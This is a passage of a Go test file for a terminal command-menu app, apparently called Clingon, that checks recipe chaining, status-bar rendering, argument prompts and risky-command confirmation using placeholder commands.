	sec := &config.Section{Name: "Recipes", Icon: "•", Category: "Clingon", Groups: []config.Group{{Name: "Current recipe"}}}
	m := New(Options{Config: &config.Config{}, Builtin: func() []*config.Section { return []*config.Section{sec} }})
	m.Update(tea.WindowSizeMsg{Width: 60, Height: 40})
	if it := m.list.selected(); it == nil || it.title != "Recipes" {
		t.Fatalf("it should be listed, at %+v", it)
	}
	_ = m.view()
	m.Update(tea.KeyPressMsg{Code: tea.KeyEnter})
	if m.section != sec {
		t.Fatal("it should open")
	}
	for _, k := range []tea.KeyPressMsg{
		{Code: tea.KeyDown}, {Code: tea.KeyUp}, {Code: tea.KeyPgDown}, {Code: tea.KeyEnter}, {Code: tea.KeyRight},
		typed("]"), typed("["), typed("1"), typed("x"), typed("/"), typed("a"), typed("/"),
	} {
		m.Update(k)
		if view := ansi.Strip(m.view()); !strings.Contains(view, "CURRENT RECIPE") && m.list.query() == "" {
			t.Errorf("after %q the heading should still show:\n%s", k.String(), view)
		}
	}
	if len(m.recipe) != 0 || m.section != sec || m.mode != modeBrowse {
		t.Fatalf("nothing there to act on: recipe %v, mode %v", m.recipe, m.mode)
	}
	m.Update(tea.KeyPressMsg{Code: tea.KeyLeft})
	if m.section != nil {
		t.Fatal("← should go back")
	}
}

func TestCurrentRecipeListsTheSteps(t *testing.T) {
	cfg := func(names ...string) *config.Config {
		var cmds []config.Command
		for _, n := range names {
			cmds = append(cmds, config.Command{Name: n, Cmd: "run " + n})
		}
		return &config.Config{Sections: []config.Section{{Name: "AWS", Icon: "•", Category: config.Other, Commands: cmds}}}
	}
	next := cfg("a", "b", "c")
	var sent []string
	m := New(Options{Config: cfg("a", "b", "c"), Reload: func() (*config.Config, error) { return next, nil },
		Send: func(c string) error { sent = append(sent, c); return nil },
		Builtin: func() []*config.Section {
			return []*config.Section{{Name: RecipesSection, Icon: "•", Category: "Clingon", Groups: []config.Group{{Name: "Current recipe"}}}}
		}})
	m.Update(tea.WindowSizeMsg{Width: 60, Height: 40})
	press := func(s string) { t.Helper(); m.Update(typed(s)) }
	rows := func() string {
		var got []string
		for _, it := range m.list.view {
			if !it.header {
				n := 0
				if steps := m.itemSteps(it); len(steps) > 0 {
					n = steps[0]
				}
				got = append(got, fmt.Sprintf("%d%s", n, it.title))
			}
		}
		return strings.Join(got, " ")
	}

	// Nothing yet: r still goes there, and says how to start.
	press("r")
	if m.section != m.recipesSection() || rows() != "" {
		t.Fatalf("r should open the empty recipe: section %v, rows %q", m.section, rows())
	}
	if m.hint != "" {
		t.Errorf("the pane says how to start, so the bar keeps its keys: got %q", m.hint)
	}
	if got := ansi.Strip(m.view()); !strings.Contains(got, "Nothing yet") || !strings.Contains(got, "HOW RECIPES WORK") ||
		!strings.Contains(got, "press 1 on the first command") || strings.Contains(got, "DESCRIPTION") {
		t.Errorf("an empty recipe should say how to start:\n%s", got)
	}

	// Numbered elsewhere, listed here in order, from any list.
	m.showSection(&m.opt.Config.Sections[0])
	press("1") // a
	m.Update(tea.KeyPressMsg{Code: tea.KeyDown})
	m.Update(tea.KeyPressMsg{Code: tea.KeyDown})
	press("2") // c
	m.Update(tea.KeyPressMsg{Code: tea.KeyUp})
	press("3") // b
	if bar := ansi.Strip(m.barBody(80)); !strings.HasPrefix(strings.TrimSpace(bar), "r recipe · x clear  1  a") {
		t.Errorf("the bar should offer the keys, got %q", bar)
	}
	press("r")
	if rows() != "0Run recipe 1a 2c 3b" {
		t.Fatalf("rows = %q", rows())
	}
	if it := m.list.selected(); it == nil || it.title != "Run recipe" {
		t.Errorf("r should land on Run recipe, at %+v", it)
	}
	if row := ansi.Strip(m.list.row(m.list.view[2], false, 30)); !strings.HasPrefix(row, "    a · AWS") {
		t.Errorf("the steps should sit indented under it: %q", row)
	}
	if view := ansi.Strip(m.view()); !strings.Contains(view, "CURRENT RECIPE") || !strings.Contains(view, "a · AWS") {
		t.Errorf("the rows should say where they're from:\n%s", view)
	}

	// The numbers work here too, and the list keeps up.
	m.Update(tea.KeyPressMsg{Code: tea.KeyDown})
	m.Update(tea.KeyPressMsg{Code: tea.KeyDown})
	press("2") // c's own number: it goes, and the cursor stays in place
	if rows() != "0Run recipe 1a 2b" {
		t.Fatalf("rows = %q", rows())
	}
	if it := m.list.selected(); it == nil || it.title != "b" {
		t.Errorf("the cursor should stay put, at %+v", it)
	}
	press("4") // past what's left: refused
	if rows() != "0Run recipe 1a 2b" {
		t.Fatalf("rows = %q", rows())
	}

	// At the top, the row says what's in it before it's opened.
	m.Update(tea.KeyPressMsg{Code: tea.KeyLeft})
	if it := m.list.selected(); it == nil || it.title != RecipesSection {
		t.Fatalf("← should land on its row, at %+v", it)
	}
	if view := ansi.Strip(m.view()); !strings.Contains(view, "2 COMMANDS") || !strings.Contains(view, "Current recipe: a, b") {
		t.Errorf("the info pane should list the steps:\n%s", view)
	}

	// A command that's gone leaves the recipe, and what it still runs is new.
	next = cfg("b", "z")
	next.Sections[0].Commands[0].Desc = "reloaded"
	if !m.reload() {
		t.Fatal("expected a reload")
	}
	if len(m.recipe) != 1 || m.recipe[0].ref.cmd.Name != "b" || m.recipe[0].ref.cmd.Desc != "reloaded" {
		t.Fatalf("recipe after reload = %+v", m.recipe)
	}

	// r is text in a filter, and does nothing where the section isn't shown.
	m.showRoot("")
	press("/")
	press("r")
	if m.list.query() != "r" || m.section != nil {
		t.Errorf("r should filter: query %q, section %v", m.list.query(), m.section)
	}
	plain := New(Options{Config: cfg("a")})
	plain.Update(tea.WindowSizeMsg{Width: 60, Height: 40})
	plain.Update(typed("r"))
	if plain.section != nil || plain.hint != "Press / to filter" {
		t.Errorf("no section to go to: section %v, hint %q", plain.section, plain.hint)
	}
}

func TestRunningARecipe(t *testing.T) {
	cmds := []config.Command{
		{Name: "ask", Cmd: "ask <what>", Args: []config.Arg{{Name: "what"}}},
		{Name: "bad", Cmd: "bad"},
		{Name: "one", Cmd: "one"},
		{Name: "other", Cmd: "other"},
		{Name: "risky", Cmd: "risky", Risk: config.RiskWarn},
		{Name: "two", Cmd: "two"},
	}
	var sent []string
	failed, known := false, true
	shell := ShellState{}
	m := New(Options{
		Config: &config.Config{Sections: []config.Section{{Name: "S", Icon: "•", Category: config.Other, Commands: cmds}}},
		Send:   func(c string) error { sent = append(sent, c); return nil }, WaitIdle: func() bool { return true },
		LastFailed: func() (bool, bool) { return failed, known }, Shell: func() ShellState { return shell },
		Builtin: func() []*config.Section {
			return []*config.Section{{Name: RecipesSection, Icon: "•", Category: "Clingon", Groups: []config.Group{{Name: "Current recipe"}}}}
		}})
	m.Update(tea.WindowSizeMsg{Width: 60, Height: 40})
	on := func(name string) {
		t.Helper()
		for i, it := range m.list.view {
			if it.title == name {
				m.list.cursor = i
				return
			}
		}
		t.Fatalf("no row %q", name)
	}
	build := func(names ...string) {
		t.Helper()
		m.Update(typed("x"))
		m.showSection(&m.opt.Config.Sections[0])
		for i, name := range names {
			on(name)
			m.Update(typed(fmt.Sprint(i + 1)))
		}
		sent, m.errMsg, m.hint = nil, "", ""
	}
	right := func() { t.Helper(); m.Update(tea.KeyPressMsg{Code: tea.KeyRight}) }
	start := func() { t.Helper(); m.Update(typed("r")); on("Run recipe"); right() }
	done := func(ok bool) { t.Helper(); m.Update(idleMsg{seq: m.run.seq, ok: ok}) }
	sentIs := func(want string) {
		t.Helper()
		if got := strings.Join(sent, " "); got != want {
			t.Errorf("sent %q, want %q", got, want)
		}
	}

	// A command runs by itself as usual, numbered or not, and the recipe stays.
	build("one", "two")
	for _, name := range []string{"other", "two"} {
		on(name)
		right()
		m.Update(idleMsg{seq: m.runSeq, ok: true})
		m.showSection(&m.opt.Config.Sections[0])
	}
	sentIs("other two")
	m.Update(typed("r"))
	on("two") // in the recipe's own list, it's the recipe from there
	right()
	done(true)
	sentIs("other two two")
	if m.run != nil || len(m.recipe) != 2 {
		t.Fatalf("that shouldn't touch the recipe: run %+v, recipe %v", m.run, m.recipe)
	}
	sent = nil

	// r lands on Run recipe, so r then → runs the chain, one step at a time.
	m.Update(typed("r"))
	if m.details(); m.list.selected().title != "Run recipe" {
		t.Fatalf("r should land on Run recipe, at %+v", m.list.selected())
	}
	if _, desc := m.details(); !strings.Contains(desc, "Runs 2 commands in order") {
		t.Errorf("it should say what it does, got %q", desc)
	}
	right()
	sentIs("one")
	right() // mid-run: locked, with a word on how to stop
	m.Update(typed("1"))
	sentIs("one")
	if len(m.recipe) != 2 {
		t.Fatalf("the steps can't change mid-run: %v", m.recipe)
	}
	m.Update(idleMsg{seq: -1, ok: true}) // some other wait ending says nothing about the step
	sentIs("one")
	done(true)
	sentIs("one two")
	done(true)
	if m.run != nil || len(m.recipe) != 2 {
		t.Fatalf("a finished recipe stays: run %+v, recipe %v", m.run, m.recipe)
	}
	if !strings.Contains(m.hint, "finished: 2 commands") {
		t.Errorf("hint = %q", m.hint)
	}
	start() // and runs again
	done(true)
	done(true)
	sentIs("one two one two")
	if m.run != nil || len(m.recipe) != 2 {
		t.Fatalf("still there after a second run: run %+v, recipe %v", m.run, m.recipe)
	}
	sent = []string{"one", "two"}
	// Finished, the commands are as they were.
	m.showSection(&m.opt.Config.Sections[0])
	on("other")
	right()
	sentIs("one two other")
	m.Update(idleMsg{seq: m.runSeq, ok: true})

	// A failed step stops it there, and keeps the recipe to look at.
	build("one", "bad", "two")
	start()
	done(true)
	failed = true
	done(true)
	failed = false
	sentIs("one bad")
	if m.run != nil || len(m.recipe) != 3 || !strings.Contains(m.errMsg, "command 2, bad: it failed") {
		t.Fatalf("run %+v, recipe %v, err %q", m.run, m.recipe, m.errMsg)
	}
	start() // and it can go again, from the top
	sentIs("one bad one")
	m.Update(typed("x")) // x clears it, with what's running left to finish
	if m.run != nil || len(m.recipe) != 0 || !strings.Contains(m.hint, "Recipe cleared") {
		t.Fatalf("run %+v, recipe %v, hint %q", m.run, m.recipe, m.hint)
	}
	m.Update(idleMsg{seq: m.runSeq, ok: true})
	sentIs("one bad one")

	// Blanks are asked for when the step's reached, not before.
	build("one", "ask", "two")
	start()
	sentIs("one")
	done(true)
	if m.mode != modeFill || m.job == nil || m.job.ref.cmd.Name != "ask" {
		t.Fatalf("it should ask now: mode %v", m.mode)
	}
	m.Update(typed("v"))
	m.Update(tea.KeyPressMsg{Code: tea.KeyEnter})
	sentIs("one ask v")
	done(true)
	sentIs("one ask v two")
	done(true)

	// Backing out of a step's blanks stops the recipe, and keeps it.
	build("ask", "two")
	start()
	m.Update(tea.KeyPressMsg{Code: tea.KeyLeft})
	sentIs("")
	if m.run != nil || m.mode != modeBrowse || len(m.recipe) != 2 || !strings.Contains(m.hint, "stopped at command 1") {
		t.Fatalf("run %+v, mode %v, recipe %v, hint %q", m.run, m.mode, m.recipe, m.hint)
	}

	// A risky step still asks, and "no" stops there.
	build("one", "risky", "two")
	start()
	done(true)
	if m.mode != modeConfirm {
		t.Fatalf("a risky step should ask, mode %v", m.mode)
	}
	answer(m, false)
	sentIs("one")
	if m.run != nil || len(m.recipe) != 3 || !strings.Contains(m.hint, "stopped at command 2") {
		t.Fatalf("run %+v, hint %q", m.run, m.hint)
	}
	// "yes" goes on.
	start()
	done(true)
	answer(m, true)
	sentIs("one one risky")
	done(true)
	sentIs("one one risky two")
	done(true)

	// A shell left mid-command is no place for the next step.
	build("one", "two")
	start()
	shell = ShellState{Typed: unfinishedCommand}
	done(true)
	sentIs("one")
	if m.run != nil || !strings.Contains(m.errMsg, "still waiting") {
		t.Fatalf("run %+v, err %q", m.run, m.errMsg)
	}
	shell = ShellState{}

	// Not knowing whether it finished stops it too.
	build("one", "two")
	start()
	done(false)
	sentIs("one")
	if m.run != nil || !strings.Contains(m.errMsg, "couldn't tell") {
		t.Fatalf("run %+v, err %q", m.run, m.errMsg)
	}

	// x says so when there's a recipe; with none, an x is just a stray letter.
	build("one")
	m.Update(typed("x"))
	if len(m.recipe) != 0 || m.hint != "Recipe cleared" {
		t.Errorf("recipe %v, hint %q", m.recipe, m.hint)
	}
	m.Update(typed("x"))
	if m.hint != "Press / to filter" {
		t.Errorf("hint = %q", m.hint)
	}
	// A section row still opens, recipe or not.
	build("one")
	m.showRoot("")
	m.Update(tea.KeyPressMsg{Code: tea.KeyRight})
	if m.section == nil {
		t.Error("→ on a section should open it")
	}
}

// Focus comes back to the menu only when the recipe needs it, or it's over.
func TestRecipeFocusComesBackWhenNeeded(t *testing.T) {
	focused := 0
	m := New(Options{Config: &config.Config{Sections: []config.Section{{Name: "S", Icon: "•", Category: config.Other, Commands: []config.Command{
		{Name: "a", Cmd: "a"}, {Name: "b", Cmd: "b"}, {Name: "c", Cmd: "c <what>", Args: []config.Arg{{Name: "what"}}},
	}}}}, Send: func(string) error { return nil }, WaitIdle: func() bool { return true }, FocusMenu: func() { focused++ },
		Builtin: func() []*config.Section {
			return []*config.Section{{Name: RecipesSection, Icon: "•", Category: "Clingon", Groups: []config.Group{{Name: "Current recipe"}}}}
		}})
	m.Update(tea.WindowSizeMsg{Width: 60, Height: 40})
	m.showSection(&m.opt.Config.Sections[0])
	for i := range 3 {
		m.list.cursor = i + 1
		m.Update(typed(fmt.Sprint(i + 1)))
	}
	m.Update(typed("r"))
	m.Update(tea.KeyPressMsg{Code: tea.KeyRight})
	want := func(n int, when string) {
		t.Helper()
		if focused != n {
			t.Errorf("%s: focus brought back %d times, want %d", when, focused, n)
		}
	}
	m.Update(idleMsg{seq: m.run.seq, ok: true})
	want(0, "going straight on to the next step")
	m.Update(idleMsg{seq: m.run.seq, ok: true})
	want(1, "at a step with a blank")
	m.Update(tea.FocusMsg{}) // that focus arriving: the user is here now
	m.Update(typed("v"))
	m.Update(tea.KeyPressMsg{Code: tea.KeyEnter})
	m.Update(tea.BlurMsg{})
	m.Update(tea.FocusMsg{}) // a late one from earlier mustn't cost the last return
	m.Update(idleMsg{seq: m.run.seq, ok: true})
	want(2, "at the end")
}

// The bar reaches its pane without going through the renderer: it has to be in
// the palette's 256 colours by itself, with every colour still there.
func TestBarIsDrawnIn256Colours(t *testing.T) {
	var drawn string
	m := New(Options{Config: &config.Config{Sections: []config.Section{
		{Name: "S", Icon: "•", Category: config.Other, Commands: []config.Command{{Name: "a", Cmd: "a"}}},
	}}, Send: func(string) error { return nil }, Bar: func(l string) { drawn = l }, BarWidth: func() int { return 40 }})
	m.Update(tea.WindowSizeMsg{Width: 60, Height: 40})
	m.showSection(&m.opt.Config.Sections[0])
	_, cmd := m.Update(typed("1"))
	if cmd == nil {
		t.Fatal("the bar should redraw")
	}
	if batch, ok := cmd().(tea.BatchMsg); ok {
		for _, c := range batch {
			if c != nil {
				c()
			}
		}
	}
	if strings.Contains(drawn, "38;2;") || strings.Contains(drawn, "48;2;") {
		t.Errorf("24-bit colour in the bar: %q", drawn)
	}
	for _, want := range []string{"38;5;79", "48;5;212", "\x1b[40m"} { // the name, the badge, the band (ANSI black: the raised violet)
		if !strings.Contains(drawn, want) {
			t.Errorf("no %s in the bar: %q", want, drawn)
		}
	}
	if got := ansi.Strip(drawn); ansi.StringWidth(got) != 40 || !strings.Contains(got, "1  a") {
		t.Errorf("the text should be untouched: %q", got)
	}
}

func TestFillInNamesTheCommand(t *testing.T) {
	args := []config.Arg{{Name: "count"}, {Name: "kind", Options: []config.Option{{Value: "x"}, {Value: "y"}}}}
	m := New(Options{Config: &config.Config{Sections: []config.Section{{Name: "S", Icon: "•", Category: config.Other, Commands: []config.Command{
		{Name: "First", Cmd: "first"},
		{Name: "Biggest things here", Cmd: "big <count> <kind>", Args: args},
	}}}}, Send: func(string) error { return nil }, WaitIdle: func() bool { return true }, Builtin: func() []*config.Section {
		return []*config.Section{{Name: RecipesSection, Icon: "•", Category: "Clingon", Groups: []config.Group{{Name: "Current recipe"}}}}
	}})
	m.Update(tea.WindowSizeMsg{Width: 60, Height: 40})
	m.showSection(&m.opt.Config.Sections[0])
	m.list.cursor = 2
	m.Update(tea.KeyPressMsg{Code: tea.KeyRight})
	lines := func(w, h int) []string { return strings.Split(ansi.Strip(m.fillView(w, h)), "\n") }
	got := lines(60, 20)
	row := func(l string) string { return strings.TrimSpace(strings.TrimPrefix(l, "▌")) }
	if row(got[0]) != "Step 1 of 2" || got[1] != "" || row(got[2]) != "count (type)" || !strings.HasPrefix(row(got[3]), "❯") || strings.Contains(strings.Join(got, "\n"), "BIGGEST") {
		t.Errorf("how far along alone, then the blank with its input, and no heading:\n%q", got[:4])
	}
	// Only your answer is in the panel: it has the edge, and fills the width.
	if strings.HasPrefix(got[0], "▌") || strings.HasPrefix(got[2], "▌") || !strings.HasPrefix(got[3], "▌") || ansi.StringWidth(got[3]) != 60 {
		t.Errorf("panel: %q", got[:4])
	}
	if head := lines(10, 20)[0]; ansi.StringWidth(head) > 10 {
		t.Errorf("a narrow panel should fit: %q", head)
	}
	if got := lines(60, 5); !strings.HasPrefix(row(got[0]), "count (type)  Step 1 of 2") {
		t.Errorf("no room: the blank and how far along on one line: %q", got)
	}

	// A pick list keeps its rows in the height it's given, header and all.
	m.Update(typed("3"))
	m.Update(tea.KeyPressMsg{Code: tea.KeyEnter})
	if got := lines(60, 8); !strings.HasPrefix(got[0], "❯ / to filter") || got[1] != "" || row(got[2]) != "Step 2 of 2" || got[3] != "" || row(got[4]) != "kind (↑↓ to choose)" || !strings.Contains(got[5], "x") || len(got) > 8 {
		t.Errorf("pick list: %q", got)
	}
	m.Update(tea.KeyPressMsg{Code: tea.KeyLeft})
	m.Update(tea.KeyPressMsg{Code: tea.KeyLeft})
	m.Update(tea.KeyPressMsg{Code: tea.KeyLeft})
	if m.mode != modeBrowse {
		t.Fatalf("← should leave the command, mode %v", m.mode)
	}

	// As a step of a recipe, it says which.
	m.showSection(&m.opt.Config.Sections[0])
	m.list.cursor = 1
	m.Update(typed("1"))
	m.list.cursor = 2
	m.Update(typed("2"))
	m.Update(typed("r"))
	m.Update(tea.KeyPressMsg{Code: tea.KeyRight})
	m.Update(idleMsg{seq: m.run.seq, ok: true})
	if head := row(lines(60, 20)[0]); head != "Recipe command 2 of 2 · Step 1 of 2" {
		t.Errorf("head = %q", head)
	}
}

func TestRiskyScreensNameTheCommand(t *testing.T) {
	m := New(Options{Config: &config.Config{Sections: []config.Section{{Name: "S", Icon: "•", Category: config.Other, Commands: []config.Command{
		{Name: "Burn it", Cmd: "burn", Risk: config.RiskDanger},
		{Name: "First", Cmd: "first"},
		{Name: "Stop it", Cmd: "stop", Risk: config.RiskWarn},
	}}}}, Send: func(string) error { return nil }, WaitIdle: func() bool { return true }, Builtin: func() []*config.Section {
		return []*config.Section{{Name: RecipesSection, Icon: "•", Category: "Clingon", Groups: []config.Group{{Name: "Current recipe"}}}}
	}})
	m.Update(tea.WindowSizeMsg{Width: 60, Height: 40})
	on := func(name string) {
		t.Helper()
		m.showSection(&m.opt.Config.Sections[0])
		for i, it := range m.list.view {
			if it.title == name {
				m.list.cursor = i
			}
		}
	}
	lines := func(h int) []string { return strings.Split(ansi.Strip(m.confirmView(60, h)), "\n") }

	on("Stop it")
	m.Update(tea.KeyPressMsg{Code: tea.KeyRight})
	got := lines(20)
	if !strings.Contains(got[0], "This command is risky") || strings.HasPrefix(got[0], "▌") || !strings.HasPrefix(got[2], "▌") || !strings.HasPrefix(got[3], "▌") || strings.Contains(strings.Join(got, "\n"), "STOP IT") {
		t.Errorf("warn: %q", got)
	}
	if got := lines(5); !strings.Contains(got[0], "This command is risky") || len(got) != 4 {
		t.Errorf("no room: the question and answers come first: %q", got)
	}
	answer(m, false)

	// A dangerous one, through both of its screens.
	on("Burn it")
	m.Update(tea.KeyPressMsg{Code: tea.KeyRight})
	got = lines(20)
	if !strings.Contains(got[0], "burn") || !strings.Contains(got[2], dangerGlyph+" It can't be undone") {
		t.Errorf("danger: %q", got)
	}
	m.Update(typed(m.pending.code))
	m.Update(tea.KeyPressMsg{Code: tea.KeyEnter})
	got = lines(20)
	if !strings.Contains(got[0], "Last check") {
		t.Errorf("last check: %q", got)
	}
	answer(m, false)
	m.Update(tea.KeyPressMsg{Code: tea.KeyEscape})
	m.mode, m.pending = modeBrowse, nil

	// As a step of a recipe, it says which.
	on("First")
	m.Update(typed("1"))
	on("Stop it")
	m.Update(typed("2"))
	m.Update(typed("r"))
	m.Update(tea.KeyPressMsg{Code: tea.KeyRight})
	m.Update(idleMsg{seq: m.run.seq, ok: true})
	if got := lines(20); !strings.Contains(got[0], "Recipe command 2 of 2") || got[1] != "" || !strings.Contains(got[2], "risky") {
		t.Errorf("as a step: %q", got)
	}
}

func TestStatusBarShowsTheRecipe(t *testing.T) {
	shell := ShellState{}
	m := New(Options{Config: &config.Config{Sections: []config.Section{
		{Name: "AWS", Icon: "•", Category: config.Other, Commands: []config.Command{
			{Name: "List buckets", Cmd: "aws s3 ls"}, {Name: "Who am I", Cmd: "aws sts get-caller-identity"},
		}},
		{Name: "Git", Icon: "•", Category: config.Other, Commands: []config.Command{{Name: "Status", Cmd: "git status"}}},
		{Name: "Nope", Icon: "•", Category: config.Other, Needs: []string{"clingon-test-nope"}, Commands: []config.Command{{Name: "Go", Cmd: "x"}}},
	}}, Send: func(string) error { return nil }, Shell: func() ShellState { return shell }})
	m.Update(tea.WindowSizeMsg{Width: 60, Height: 40})
	m.news = &Headline{Kind: Attention, Text: "✓ some news"}
	barIs := func(w int, want string) {
		t.Helper()
		line := m.barBody(w)
		if got := strings.TrimSpace(ansi.Strip(line)); got != want {
			t.Errorf("at %d cells: got %q, want %q", w, got, want)
		}
		if got := ansi.StringWidth(line); got != w {
			t.Errorf("the bar should be %d cells wide, got %d: %q", w, got, ansi.Strip(line))
		}
	}
	barIs(80, "✓ some news")

	// Across sections: listed by number, wherever you are.
	m.showSection(&m.opt.Config.Sections[0])
	m.Update(typed("1"))
	m.showSection(&m.opt.Config.Sections[1])
	m.Update(typed("2"))
	want := "Recipe  1  List buckets →  2  Status"
	barIs(80, want)
	m.showRoot("")
	barIs(80, want) // instead of the news

	// Not enough room: names give way, numbers never do.
	barIs(29, "Recipe  1  Lis… →  2  Sta…")
	barIs(22, "Recipe  1  … →  2  …")
	barIs(20, "Recipe  1   →  2")

	// A warning about the shell still comes first, and passes.
	shell = ShellState{Typed: "git sta"}
	m.readShell()
	barIs(80, "✎ Typed in the shell: git sta · running a command asks first")
	shell = ShellState{}
	m.readShell()
	barIs(80, want)

	// Missing tools aren't hidden by it: they share the bar.
	m.showSection(&m.opt.Config.Sections[2])
	line := ansi.Strip(m.barBody(120))
	if !strings.Contains(line, "✗ Needs clingon-test-nope") || !strings.Contains(line, want) {
		t.Errorf("both should show, got %q", line)
	}
	if got := ansi.StringWidth(m.barBody(120)); got != 120 {
		t.Errorf("the split bar should be 120 cells wide, got %d", got)
	}

	// Taking the numbers off brings back what was there.
	m.showSection(&m.opt.Config.Sections[0])
	m.Update(typed("1"))
	barIs(80, "Recipe  1  Status") // the rest close up
	m.showSection(&m.opt.Config.Sections[1])
	m.Update(typed("1"))
	m.showRoot("")
	barIs(80, "✓ some news")
}

func TestTypedShellAsksFirst(t *testing.T) {
	sec := config.Section{Name: "S", Icon: "•", Category: config.Other, Commands: []config.Command{{Name: "List", Cmd: "ls"}}}
	var sent []string
	shell := ShellState{Typed: "git sta"}
	cleared, focused := 0, 0
	m := New(Options{Config: &config.Config{Sections: []config.Section{sec}},
		Send:       func(c string) error { sent = append(sent, c); return nil },
		Shell:      func() ShellState { return shell },
		ClearShell: func() error { cleared++; shell = ShellState{}; return nil },
		FocusShell: func() { focused++ }})
	m.Update(tea.WindowSizeMsg{Width: 60, Height: 40})
	m.Update(tea.FocusMsg{})
	m.showSection(&m.opt.Config.Sections[0])
	if bar := ansi.Strip(m.barBody(60)); !strings.Contains(bar, "Typed in the shell: git sta") {
		t.Errorf("the status bar should say what's typed, got %q", bar)
	}
	m.Update(tea.KeyPressMsg{Code: tea.KeyEnter})
	if m.mode != modeTyped || m.yes || len(sent) != 0 {
		t.Fatalf("want the question, with No first: mode %v sent %v", m.mode, sent)
	}
	m.Update(tea.KeyPressMsg{Code: tea.KeyEnter}) // No, take me to the shell
	if focused != 1 || len(sent) != 0 || m.mode != modeBrowse {
		t.Fatalf("No goes to the shell and sends nothing: focused %d sent %v", focused, sent)
	}
	m.Update(tea.KeyPressMsg{Code: tea.KeyEnter})
	answer(m, true) // Yes, clear it and run
	if cleared != 1 || len(sent) != 1 || sent[0] != "ls" {
		t.Fatalf("Yes clears the prompt, then sends: cleared %d sent %v", cleared, sent)
	}
}

func TestScrolledBackShellHoldsCommands(t *testing.T) {
	sec := config.Section{Name: "S", Icon: "•", Category: config.Other, Commands: []config.Command{{Name: "List", Cmd: "ls"}}}
	shell := ShellState{Scrolling: true}
	var sent []string
	m := New(Options{Config: &config.Config{Sections: []config.Section{sec}},
		Send: func(c string) error { sent = append(sent, c); return nil }, Shell: func() ShellState { return shell }})
	m.Update(tea.WindowSizeMsg{Width: 60, Height: 40})
	m.showSection(&m.opt.Config.Sections[0])
	m.Update(tea.FocusMsg{})
	m.Update(tea.KeyPressMsg{Code: tea.KeyEnter})
	if len(sent) != 0 || m.list.selected().disabled {
		t.Fatal("nothing can be sent into a scrolled-back shell, though the row isn't greyed")
	}
	if bar := ansi.Strip(m.barBody(60)); !strings.Contains(bar, "scrolled back") {
		t.Errorf("the status bar should say why, got %q", bar)
	}
	shell = ShellState{}
	m.Update(tea.FocusMsg{}) // back after pressing q there
	m.Update(tea.KeyPressMsg{Code: tea.KeyEnter})
	if len(sent) != 1 {
		t.Fatalf("once it's back at the prompt, commands run: %v", sent)
	}
}

func TestBracketsJumpInEveryTerminal(t *testing.T) {
	p := newPicker([]item{{title: "A", header: true}, {title: "a1"}, {title: "B", header: true}, {title: "b1"}}, nil, false)
	p.update(typed("]"))
	if p.selected().title != "b1" || p.query() != "" {
		t.Fatalf("] should jump, not type: at %s, filter %q", p.selected().title, p.query())
	}
	p.update(typed("["))
	if p.selected().title != "a1" {
		t.Fatalf("[ should jump back: at %s", p.selected().title)
	}
}

func TestChecklistDefaultsStartTicked(t *testing.T) {
	join := " && "
	sec := config.Section{Name: "Git", Icon: "•", Category: config.Other, Commands: []config.Command{
		{Name: "Settings", Cmd: "<s>", Args: []config.Arg{{Name: "s", Type: "flags", Join: &join, Default: "a 1 && c 3",
			Options: []config.Option{{Value: "a 1"}, {Value: "b 2"}, {Value: "c 3"}}}}},
	}}
	var sent []string
	m := New(Options{Config: &config.Config{Sections: []config.Section{sec}},
		Send: func(c string) error { sent = append(sent, c); return nil }, Dir: func() string { return t.TempDir() }})
	m.Update(tea.WindowSizeMsg{Width: 60, Height: 40})
	m.showSection(&m.opt.Config.Sections[0])
	m.Update(tea.KeyPressMsg{Code: tea.KeyEnter})
	m.Update(tea.KeyPressMsg{Code: tea.KeyEnter})
	if len(sent) != 1 || sent[0] != "a 1 && c 3" {
		t.Fatalf("want the defaults ticked, got %v", sent)
	}
}

func TestStatusBarSaysWhenAToolIsMissing(t *testing.T) {
	home := t.TempDir()
	t.Setenv("HOME", home)
	if err := os.MkdirAll(filepath.Join(home, "go", "bin"), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(home, "go", "bin", "clingon-test-gopls"), []byte("#!/bin/sh\n"), 0o755); err != nil {
		t.Fatal(err)
	}
	cmd := []config.Command{{Name: "Run", Cmd: "true"}}
	cfg := &config.Config{Sections: []config.Section{
		{Name: "Gone", Icon: "•", Category: config.Other, Commands: cmd, Needs: []string{"clingon-test-nope"}},
		{Name: "Hidden", Icon: "•", Category: config.Other, Commands: cmd, Needs: []string{"clingon-test-gopls"}},
		{Name: "Shell", Icon: "•", Category: config.Other, Commands: cmd, Needs: []string{"sh"}},
	}}
	news := Headline{Kind: Attention, Text: "↻ 2 pack updates for git, docker"}
	m := New(Options{Config: cfg, Dir: func() string { return t.TempDir() }, Headline: func() Headline { return news }})
	m.Update(tea.WindowSizeMsg{Width: 200, Height: 40})
	bar := func() string {
		b := m.barBody(200)
		if ansi.StringWidth(b) != 200 {
			t.Errorf("the bar should fill the width, got %d", ansi.StringWidth(b))
		}
		return strings.TrimSpace(ansi.Strip(b))
	}
	if bar() != news.Text { // the top level has news; missing tools are for sections
		t.Errorf("top menu: got %q, want %q", bar(), news.Text)
	}
	for i, want := range []string{"✗ Needs clingon-test-nope (not installed)", "✗ Needs clingon-test-gopls (not on PATH: it's in ~/go/bin)", "→ go · ← back · / filter · [ ] jump"} {
		m.showSection(&cfg.Sections[i])
		if bar() != want {
			t.Errorf("%s: got %q, want %q", cfg.Sections[i].Name, bar(), want)
		}
	}
	if !strings.HasSuffix(strings.TrimSpace(ansi.Strip(m.view())), "→ go · ← back · / filter · [ ] jump") {
		t.Error("the status bar should be the last line")
	}
}

// The bar shows the keys when it has nothing better to say, and they're the
// ones that work where you are.
func TestStatusBarShowsTheKeys(t *testing.T) {
	sections := []config.Section{{Name: "S", Icon: "•", Category: config.Other, Commands: []config.Command{{Name: "a", Cmd: "a"}, {Name: "r", Cmd: "r", Risk: config.RiskWarn}}}}
	m := New(Options{Config: &config.Config{Sections: sections}, Send: func(string) error { return nil }, FocusMenu: func() {},
		WaitIdle: func() bool { return true }, Shell: func() ShellState { return ShellState{} },
		Builtin: func() []*config.Section {
			return []*config.Section{{Name: RecipesSection, Icon: "•", Category: "Clingon", Groups: []config.Group{{Name: "Current recipe"}}}}
		}})
	m.Update(tea.WindowSizeMsg{Width: 60, Height: 40})
	barIs := func(when, want string) {
		t.Helper()
		line := m.statusBar(120)
		if got := strings.TrimSpace(ansi.Strip(line)); got != strings.TrimSpace(" ? help  "+want) {
			t.Errorf("%s: bar %q, want %q", when, got, want)
		}
		if w := ansi.StringWidth(line); w != 120 {
			t.Errorf("%s: bar is %d wide", when, w)
		}
	}
